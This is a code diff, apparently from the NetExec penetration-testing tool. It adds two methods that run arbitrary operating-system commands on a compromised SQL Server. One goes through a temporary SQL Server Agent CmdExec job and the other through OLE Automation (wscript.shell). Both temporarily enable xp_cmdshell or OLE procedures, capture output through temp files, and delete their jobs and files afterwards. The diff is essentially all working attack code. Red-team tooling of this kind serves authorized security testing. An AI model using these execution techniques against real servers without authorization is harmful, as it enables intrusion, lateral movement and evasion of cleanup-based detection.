@@ -1,4 +1,8 @@
 import binascii
+import contextlib
+import time
+
+from nxc.helpers.misc import gen_random_string
 
 
 class MSSQLEXEC:
@@ -66,6 +70,118 @@ class MSSQLEXEC:
         # Assuming the query returns a list of dictionaries with 'config_value' as the key
         self.logger.debug(f"{option} check result: {result}")
         return bool(result and result[0]["config_value"] == 1)
+
+    def execute_agent_job(self, command):
+        """Execute command via SQL Server Agent Job (CmdExec subsystem).
+        Runs as the SQL Server Agent service account (typically NT Service\\SQLSERVERAGENT).
+        Requires SQL Server Agent service to be running.
+        """
+        result = ""
+        job_name = f"nxc_{gen_random_string(6)}"
+        step_name = gen_random_string(6)
+        tmp_file = f"C:\\Windows\\Temp\\{gen_random_string(8)}.txt"
+
+        self.backup_and_enable("advanced options")
+        self.backup_and_enable("xp_cmdshell")
+
+        try:
+            escaped_cmd = command.replace("'", "''")
+
+            for query in [
+                f"USE msdb; EXEC sp_add_job @job_name = N'{job_name}';",
+                f"USE msdb; EXEC sp_add_jobstep @job_name = N'{job_name}', @step_name = N'{step_name}', @subsystem = N'CmdExec', @command = N'cmd /c \"{escaped_cmd}\" > {tmp_file} 2>&1', @retry_attempts = 0;",
+                f"USE msdb; EXEC sp_add_jobserver @job_name = N'{job_name}';",
+                f"USE msdb; EXEC sp_start_job @job_name = N'{job_name}';",
+            ]:
+                self.logger.debug(f"Agent job query: {query}")
+                self.mssql_conn.sql_query(query)
+
+            # Poll for completion — status 4 = Idle (done), 1 = Executing
+            completed = False
+            time.sleep(1)
+            for _ in range(30):
+                status = self.mssql_conn.sql_query(f"EXEC msdb.dbo.sp_help_job @job_name = N'{job_name}', @job_aspect = N'JOB'")
+                self.logger.debug(f"Agent job status: {status}")
+                if status and status[0].get("current_execution_status") == 4:
+                    completed = True
+                    break
+                time.sleep(1)
+
+            if not completed:
+                self.logger.error("Agent job timed out after 30 seconds")
+            else:
+                raw = self.mssql_conn.sql_query(f"EXEC xp_cmdshell 'type \"{tmp_file}\"'")
+                if raw:
+                    result = "\n".join(line["output"] for line in raw if line.get("output") and line["output"] != "NULL")
+
+        except Exception as e:
+            self.logger.error(f"Error executing via agent job: {e}")
+        finally:
+            with contextlib.suppress(Exception):
+                self.mssql_conn.sql_query(f"USE msdb; EXEC sp_delete_job @job_name = N'{job_name}', @delete_unused_schedule = 1;")
+            with contextlib.suppress(Exception):
+                self.mssql_conn.sql_query(f"EXEC xp_cmdshell 'del \"{tmp_file}\"'")
+            self.restore("xp_cmdshell")
+            self.restore("advanced options")
+
+        return result
+
+    def execute_ole(self, command):
+        """Execute command via OLE Automation (wscript.shell).
+        Output is captured by writing to a temp file read back via ADODB.Stream.
+        Does not use xp_cmdshell.
+        """
+        result = ""
+        tmp_file = f"C:\\Windows\\Temp\\{gen_random_string(8)}.txt"
+
+        self.backup_and_enable("advanced options")
+        self.backup_and_enable("Ole Automation Procedures")
+
+        try:
+            escaped_cmd = command.replace("'", "''")
+
+            run_q = f"""
+                DECLARE @objShell INT;
+                EXEC sp_OACreate 'wscript.shell', @objShell OUTPUT;
+                EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "{escaped_cmd}" > {tmp_file} 2>&1', 0, 1;
+                EXEC sp_OADestroy @objShell;
+            """
+            self.logger.debug(f"OLE run query: {run_q}")
+            self.mssql_conn.sql_query(run_q)
+
+            read_q = f"""
+                DECLARE @objStream INT;
+                DECLARE @fileContent NVARCHAR(MAX);
+                EXEC sp_OACreate 'ADODB.Stream', @objStream OUTPUT;
+                EXEC sp_OASetProperty @objStream, 'Type', 2;
+                EXEC sp_OASetProperty @objStream, 'Charset', 'utf-8';
+                EXEC sp_OAMethod @objStream, 'Open';
+                EXEC sp_OAMethod @objStream, 'LoadFromFile', NULL, '{tmp_file}';
+                EXEC sp_OAMethod @objStream, 'ReadText', @fileContent OUTPUT;
+                EXEC sp_OAMethod @objStream, 'Close';
+                EXEC sp_OADestroy @objStream;
+                SELECT @fileContent AS output;
+            """
+            self.logger.debug(f"OLE read query: {read_q}")
+            raw = self.mssql_conn.sql_query(read_q)
+            if raw and raw[0].get("output"):
+                result = raw[0]["output"].strip()
+
+        except Exception as e:
+            self.logger.error(f"Error executing via OLE automation: {e}")
+        finally:
+            with contextlib.suppress(Exception):
+                cleanup_q = f"""
+                    DECLARE @objShellClean INT;
+                    EXEC sp_OACreate 'wscript.shell', @objShellClean OUTPUT;
+                    EXEC sp_OAMethod @objShellClean, 'run', NULL, 'cmd.exe /c del {tmp_file}', 0, 1;
+                    EXEC sp_OADestroy @objShellClean;
+                """
+                self.mssql_conn.sql_query(cleanup_q)
+            self.restore("Ole Automation Procedures")
+            self.restore("advanced options")
+
+        return result
 
     def put_file(self, data, remote):
         try:
